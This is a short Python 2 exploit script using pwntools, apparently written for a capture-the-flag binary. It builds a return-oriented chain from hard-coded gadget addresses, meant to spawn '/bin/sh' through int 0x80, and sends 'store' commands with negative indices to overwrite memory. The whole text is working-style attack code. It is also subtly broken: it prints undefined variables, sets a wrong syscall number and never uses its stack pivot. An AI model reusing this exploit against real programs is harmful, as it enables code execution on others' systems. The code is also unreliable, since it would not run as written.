import sys
from pwn import *

printf=sys.stdout.write;

arg="/bin/sh\x00"
cmd_addr = 0xbfff0000
arg_addr = cmd_addr + 0x6
new_stack_addr = arg_addr + len(arg)

buffer_fill = arg + "A" * (128-len(arg)) + "AAAABBBBCCCC"

pop_eax  = p32(0x080bc4d6)
pop_ebx  = p32(0x080481c9)
pop_ecx  = p32(0x080e6255)
pop_edx  = p32(0x0806f3aa)
int_0x80 = p32(0x0806ced5)
pop_esp  = p32(0x080bc486)
rop_ret  = p32(0x00)

# pivot
pivot   = pop_esp + p32(new_stack_addr)

payload = "store\x00"             +\
	  arg                     +\
	  pop_eax + p32(0x0d)     +\
	  pop_ecx + p32(0x00)     +\
	  pop_edx + p32(0x00)     +\
	  pop_ebx + p32(arg_addr) +\
	  int_0x80

print "store"
print argument
print "-10"

print "store\x00" + payload
print ret_address
print "-11"
